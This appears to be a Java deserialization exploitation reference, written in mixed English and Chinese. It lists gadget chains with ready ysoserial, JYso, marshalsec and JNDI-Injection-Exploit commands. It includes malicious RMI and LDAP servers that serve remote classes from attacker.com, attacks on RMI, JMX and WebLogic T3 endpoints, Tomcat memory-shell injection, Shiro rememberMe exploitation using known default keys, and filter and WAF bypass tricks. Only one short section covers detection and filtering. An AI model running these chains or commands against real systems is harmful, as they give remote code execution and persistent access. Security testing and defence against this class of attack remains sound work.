# Java Deserialization Gadget Chains Reference

> Phase 4 Validation Knowledge Base — Java Deserialization

---

## 1. CommonsCollections Chains

### CC1 — LazyMap + ChainedTransformer

- **Dependencies**: `commons-collections:3.1` – `3.2.1`
- **JDK**: ≤ 8u71 (需要 `sun.reflect.annotation.AnnotationInvocationHandler`)
- **Sink**: `Runtime.exec()`

```bash
java -jar ysoserial.jar CommonsCollections1 "id" | base64
```

```java
// Trigger path:
// AnnotationInvocationHandler.readObject()
//   → Map(Proxy).entrySet()
//     → LazyMap.get()
//       → ChainedTransformer.transform()
//         → InvokerTransformer.transform()
//           → Runtime.exec()
```

### CC2 — PriorityQueue + TransformingComparator

- **Dependencies**: `commons-collections4:4.0`
- **JDK**: 无限制
- **Sink**: `TemplatesImpl.newTransformer()`

```bash
java -jar ysoserial.jar CommonsCollections2 "id"
```

```java
// PriorityQueue.readObject()
//   → PriorityQueue.heapify()
//     → TransformingComparator.compare()
//       → InvokerTransformer.transform()
//         → TemplatesImpl.newTransformer()
//           → defineClass() → 任意代码
```

### CC3 — TrAXFilter + InstantiateTransformer

- **Dependencies**: `commons-collections:3.1` – `3.2.1`
- **JDK**: ≤ 8u71
- **Sink**: `TemplatesImpl.newTransformer()` (绕过 InvokerTransformer 黑名单)

```bash
java -jar ysoserial.jar CommonsCollections3 "id"
```

### CC4 — PriorityQueue + InstantiateTransformer

- **Dependencies**: `commons-collections4:4.0`
- **JDK**: 无限制
- **Sink**: `TemplatesImpl.newTransformer()`

```bash
java -jar ysoserial.jar CommonsCollections4 "id"
```

### CC5 — BadAttributeValueExpException + TiedMapEntry

- **Dependencies**: `commons-collections:3.1` – `3.2.1`
- **JDK**: ≥ 8u76 (需要 `BadAttributeValueExpException.readObject` 变更)
- **Sink**: `Runtime.exec()`

```bash
java -jar ysoserial.jar CommonsCollections5 "id"
```

```java
// BadAttributeValueExpException.readObject()
//   → TiedMapEntry.toString()
//     → LazyMap.get()
//       → ChainedTransformer.transform()
```

### CC6 — HashSet + TiedMapEntry

- **Dependencies**: `commons-collections:3.1` – `3.2.1`
- **JDK**: 无限制（不依赖 AnnotationInvocationHandler）
- **Sink**: `Runtime.exec()`

```bash
java -jar ysoserial.jar CommonsCollections6 "id"
```

```java
// HashSet.readObject()
//   → HashMap.put() → hash()
//     → TiedMapEntry.hashCode()
//       → LazyMap.get()
//         → ChainedTransformer.transform()
```

### CC7 — Hashtable + LazyMap

- **Dependencies**: `commons-collections:3.1` – `3.2.1`
- **JDK**: 无限制
- **Sink**: `Runtime.exec()`

```bash
java -jar ysoserial.jar CommonsCollections7 "id"
```

---

## 2. CommonsBeanutils Chains

### CB1 — BeanComparator + TemplatesImpl

- **Dependencies**: `commons-beanutils:1.8.x` – `1.9.x`，需 `commons-collections`
- **JDK**: 无限制
- **Sink**: `TemplatesImpl.newTransformer()`

```bash
java -jar ysoserial.jar CommonsBeanutils1 "id"
```

```java
// PriorityQueue.readObject()
//   → BeanComparator.compare()
//     → PropertyUtils.getProperty(TemplatesImpl, "outputProperties")
//       → TemplatesImpl.getOutputProperties()
//         → newTransformer() → defineClass()
```

### CB1 无依赖变体 (Shiro场景)

- **Dependencies**: 仅 `commons-beanutils`（无需 commons-collections）
- **适用**: Apache Shiro rememberMe（Shiro 自带 CB 但不带 CC）

```bash
# 使用 ysoserial 的 CommonsBeanutils1NoCC 或手工构造
java -jar ysoserial.jar CommonsBeanutils1 "id"
# Shiro 加密:
python shiro_exploit.py -u http://target/login -k kPH+bIxk5D2deZiIxcaaaA== -g CommonsBeanutils1 -c "id"
```

---

## 3. C3P0 Chains

### C3P0 — PoolBackedDataSource + JNDI

- **Dependencies**: `c3p0:0.9.x`
- **JDK**: 无限制（但 JNDI 受 JDK 版本限制）
- **Sink**: JNDI lookup / 远程类加载

```bash
java -jar ysoserial.jar C3P0 "http://attacker.com/:Exploit"
```

### C3P0 — HexBase + URLClassLoader

- **Sink**: 反序列化嵌套 gadget

```json
// Fastjson 中的 C3P0 二次反序列化
{"@type":"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource",
 "userOverridesAsString":"HexAsciiSerializedMap:ACED...;"}
```

---

## 4. JNDI Injection Chains

### JDK ≤ 8u121 / 7u131 / 6u141 — RMI Remote Reference

```bash
# 启动恶意 RMI 服务
java -cp marshalsec.jar marshalsec.jndi.RMIRefServer "http://attacker.com/#Exploit" 1099
```

```java
// Payload: lookup("rmi://attacker:1099/obj")
// JVM 自动从 codebase URL 加载远程 class
```

### JDK ≤ 8u191 — LDAP Remote Reference

```bash
# 启动恶意 LDAP 服务
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker.com/#Exploit" 1389
```

### JDK > 8u191 — 本地 Factory 绕过

```bash
# BeanFactory + ELProcessor (Tomcat)
java -jar JNDI-Injection-Exploit.jar -C "id" -A attacker.com
```

```java
// 利用 org.apache.naming.factory.BeanFactory
// 设置 forceString=x=eval
// 配合 javax.el.ELProcessor.eval() 执行 EL 表达式
```

### JDK > 8u191 — 本地反序列化绕过

```bash
# 使用 javaSerializedData 属性触发本地 gadget
java -jar JYso.jar -g CommonsCollections6 -p "id" --ldap-port 1389 --type deser
```

---

## 5. Rome (ROME RSS Library)

- **Dependencies**: `rome:1.0` / `rome:1.x`
- **JDK**: 无限制
- **Sink**: `TemplatesImpl.newTransformer()`

```bash
java -jar ysoserial.jar ROME "id"
```

```java
// HashMap.readObject()
//   → ObjectBean.hashCode()
//     → ToStringBean.toString()
//       → TemplatesImpl.getOutputProperties()
//         → newTransformer() → defineClass()
```

---

## 6. Spring Framework Chains

### Spring1 — MethodInvokeTypeProvider

- **Dependencies**: `spring-core:4.1.4` + `spring-beans:4.1.4`
- **JDK**: ≤ 8u71
- **Sink**: `Runtime.exec()`

```bash
java -jar ysoserial.jar Spring1 "id"
```

### Spring2 — MethodInvokeTypeProvider + TemplatesImpl

- **Dependencies**: `spring-core:4.1.4` + `spring-beans:4.1.4`
- **JDK**: 无限制

```bash
java -jar ysoserial.jar Spring2 "id"
```

### SpringPartiallyComparableAdvisorHolder

- **Dependencies**: `spring-aop` + `spring-context`
- **需要**: `commons-collections:3.x` 配合

---

## 7. Groovy

- **Dependencies**: `groovy:2.3.x` – `2.4.x`
- **JDK**: 无限制
- **Sink**: `MethodClosure.call()` → `Runtime.exec()`

```bash
java -jar ysoserial.jar Groovy1 "id"
```

```java
// HashMap.readObject()
//   → hash(ConvertedClosure)
//     → ConvertedClosure.invoke()
//       → MethodClosure.call()
//         → Runtime.exec()
```

---

## 8. Hibernate

### Hibernate1 — TypedValue + ComponentType

- **Dependencies**: `hibernate-core:4.x` – `5.x`
- **JDK**: 无限制
- **Sink**: `TemplatesImpl.getOutputProperties()`

```bash
java -jar ysoserial.jar Hibernate1 "id"
```

### Hibernate2 — 无需 commons-collections

- **Dependencies**: `hibernate-core:5.x`

```bash
java -jar ysoserial.jar Hibernate2 "id"
```

---

## 9. JDK Native Chains

### JDK7u21 — AnnotationInvocationHandler + LinkedHashSet

- **Dependencies**: 无（纯 JDK）
- **JDK**: 7u21 及附近版本
- **Sink**: `TemplatesImpl.newTransformer()`

```bash
java -jar ysoserial.jar Jdk7u21 "id"
```

### JDK8u20 — BeanContextSupport 补丁绕过

- **Dependencies**: 无（纯 JDK）
- **JDK**: 8u20 附近

```bash
java -jar ysoserial.jar Jdk8u20 "id"
```

### URLDNS — HashMap + URL (探测用)

- **Dependencies**: 无
- **JDK**: 全版本
- **Sink**: DNS lookup（无代码执行，用于确认反序列化触发）

```bash
java -jar ysoserial.jar URLDNS "http://xxx.dnslog.cn"
```

---

## 10. Entry Points / Attack Surfaces

### ObjectInputStream (最常见)

```java
// 危险模式
ObjectInputStream ois = new ObjectInputStream(inputStream);
Object obj = ois.readObject(); // ← 反序列化触发点
```

**检查点**: 任何接受外部字节流并调用 `readObject()` / `readUnshared()` 的位置。

### XMLDecoder

```java
XMLDecoder decoder = new XMLDecoder(new ByteArrayInputStream(xmlBytes));
Object obj = decoder.readObject(); // ← RCE
```

```xml
<!-- Payload -->
<java>
  <object class="java.lang.Runtime" method="getRuntime">
    <void method="exec">
      <string>id</string>
    </void>
  </object>
</java>
```

### Hessian / Hessian2

- **框架**: Dubbo (Hessian2), Caucho Hessian
- **Gadgets**: Rome, SpringPartiallyComparableAdvisorHolder, Resin, XBean

```bash
# Dubbo Hessian2 反序列化
java -jar JYso.jar -g Rome -p "id" --protocol hessian2
```

### Kryo

- **框架**: 部分 Spark/Flink 应用、自定义 RPC
- **限制**: 默认需注册类，但 `setRegistrationRequired(false)` 时可利用

### RMI (Remote Method Invocation)

```bash
# 攻击 RMI Registry
java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit target 1099 CommonsCollections6 "id"

# 攻击 JMX RMI
java -cp ysoserial.jar ysoserial.exploit.JMXInvokeMBean target 9999 CommonsCollections6 "id"
```

### T3 / IIOP (WebLogic)

```bash
# WebLogic T3 反序列化
python weblogic_t3.py -t target:7001 -c "id"

# IIOP 协议
java -jar JYso.jar -g CommonsCollections6 -p "id" --protocol iiop --target target:7001
```

### JMX

```bash
# 未授权 JMX 反序列化
java -cp ysoserial.jar ysoserial.exploit.JMXInvokeMBean target 9999 CommonsCollections6 "id"
```

---

## 11. Tool Commands Quick Reference

### ysoserial

```bash
# 列出所有 gadget
java -jar ysoserial.jar --help

# 生成 payload
java -jar ysoserial.jar <Gadget> "<command>"

# 常用 gadget:
# CommonsCollections1-7, CommonsBeanutils1, C3P0, ROME
# Groovy1, Hibernate1, Jdk7u21, Spring1, URLDNS

# 利用模块
java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit <host> <port> <gadget> "<cmd>"
java -cp ysoserial.jar ysoserial.exploit.JRMPListener <port> <gadget> "<cmd>"
```

### JYso（Java 反序列化利用工具）

```bash
# JNDI 注入服务器（自动适配 JDK 版本）
java -jar JYso.jar --jndi-port 1389 -g CommonsCollections6 -p "id"

# 内存马注入（Tomcat）
java -jar JYso.jar -g CommonsCollections6 -t tomcat_filter_memshell --jndi-port 1389

# 各种协议
java -jar JYso.jar -g <gadget> -p "<cmd>" --protocol [java|hessian|hessian2|iiop]

# 回显利用
java -jar JYso.jar -g CommonsCollections6 -t tomcat_echo --header "X-Token: echo-flag"
```

### marshalsec

```bash
# RMI 服务
java -cp marshalsec.jar marshalsec.jndi.RMIRefServer "http://attacker/#Exploit" [port]

# LDAP 服务
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker/#Exploit" [port]

# 各种协议 gadget
java -cp marshalsec.jar marshalsec.<Protocol> <gadget_args>
# 支持: BlazeDSAMF, Hessian, Burlap, Castor, Jackson, Java, JsonIO,
#       JYAML, Kryo, KryoAltStrategy, Red5AMF, SnakeYAML, XStream
```

### JNDI-Injection-Exploit

```bash
# 一键 JNDI 服务（RMI + LDAP + HTTP）
java -jar JNDI-Injection-Exploit.jar -C "<command>" -A <attacker_ip>

# 输出多个可用 URL:
# rmi://attacker:1099/xxx
# ldap://attacker:1389/xxx
```

---

## 12. Bypass Techniques

### JEP290 (JDK 9+ / backported 8u121+)

- **检查**: `ObjectInputFilter` 白名单/黑名单
- **绕过**: 找未受保护的 `ObjectInputStream`、利用白名单中的类

### SerialKiller / 自定义黑名单

- **常见黑名单**: `org.apache.commons.collections.functors.InvokerTransformer`
- **绕过**: 使用 CC3 (InstantiateTransformer) 或 CC2/CC4 (commons-collections4)

### RASP / WAF

- **技巧**: 分块传输、编码变换、利用解析差异
- **Unicode 绕过**: `\u0052untime` 等（Fastjson 场景）

---

## 13. Detection Patterns in Source Code

```java
// 高危: 直接反序列化外部输入
new ObjectInputStream(request.getInputStream()).readObject()
new ObjectInputStream(new ByteArrayInputStream(base64Decode(param))).readObject()

// 高危: 无过滤的反序列化
ObjectInputStream ois = new ObjectInputStream(socket.getInputStream());
Object obj = ois.readObject();

// 中危: 使用了 resolveClass 但可能不完整
class SafeObjectInputStream extends ObjectInputStream {
    @Override
    protected Class<?> resolveClass(ObjectStreamClass desc) {
        // 检查黑名单是否完整
    }
}

// 低危/安全: 使用 ObjectInputFilter (JDK9+)
ois.setObjectInputFilter(filterInfo -> {
    if (filterInfo.serialClass() != null &&
        !ALLOWED_CLASSES.contains(filterInfo.serialClass().getName())) {
        return ObjectInputFilter.Status.REJECTED;
    }
    return ObjectInputFilter.Status.ALLOWED;
});
```

---

## 14. Shiro Deserialization (Special Case)

### Key Detection

```java
// 默认密钥 (Shiro < 1.4.2)
private static final byte[] DEFAULT_CIPHER_KEY = Base64.decode("kPH+bIxk5D2deZiIxcaaaA==");

// 其他常见密钥 (硬编码)
"4AvVhmFLUs0KTA3Kprsdag=="
"3AvVhmFLUs0KTA3Kprsdag=="
"2AvVhdsgUs0FSA3SDFAdag=="
```

### Exploitation

```bash
# 使用 ShiroExploit
python shiro_exploit.py -u http://target/ -k kPH+bIxk5D2deZiIxcaaaA==

# 手动: AES-CBC 加密 → Base64 → Cookie
# rememberMe=<base64(AES(serialized_payload))>

# 检测密钥是否正确: 发送 payload 后检查响应是否包含 "rememberMe=deleteMe"
```

### Gadget 选择 (Shiro 环境)

1. `CommonsBeanutils1` (Shiro 自带 commons-beanutils)
2. `CommonsCollections` (如果目标有 commons-collections)
3. `CC_Shiro` (无 commons-collections 的特殊链)

---

## 15. Version-Gadget Matrix

| Gadget | Library | Min Version | Max Version | JDK Limit |
|--------|---------|-------------|-------------|-----------|
| CC1 | commons-collections | 3.1 | 3.2.1 | ≤8u71 |
| CC2 | commons-collections4 | 4.0 | 4.0 | None |
| CC3 | commons-collections | 3.1 | 3.2.1 | ≤8u71 |
| CC4 | commons-collections4 | 4.0 | 4.0 | None |
| CC5 | commons-collections | 3.1 | 3.2.1 | ≥8u76 |
| CC6 | commons-collections | 3.1 | 3.2.1 | None |
| CC7 | commons-collections | 3.1 | 3.2.1 | None |
| CB1 | commons-beanutils | 1.8.0 | 1.9.4 | None |
| ROME | rome | 1.0 | 1.x | None |
| Groovy1 | groovy | 2.3.0 | 2.4.x | None |
| Hibernate1 | hibernate-core | 4.0 | 5.x | None |
| Spring1 | spring-core | 4.1.4 | 4.x | ≤8u71 |
| Jdk7u21 | — | — | — | 7u21 |
| URLDNS | — | — | — | All |

---
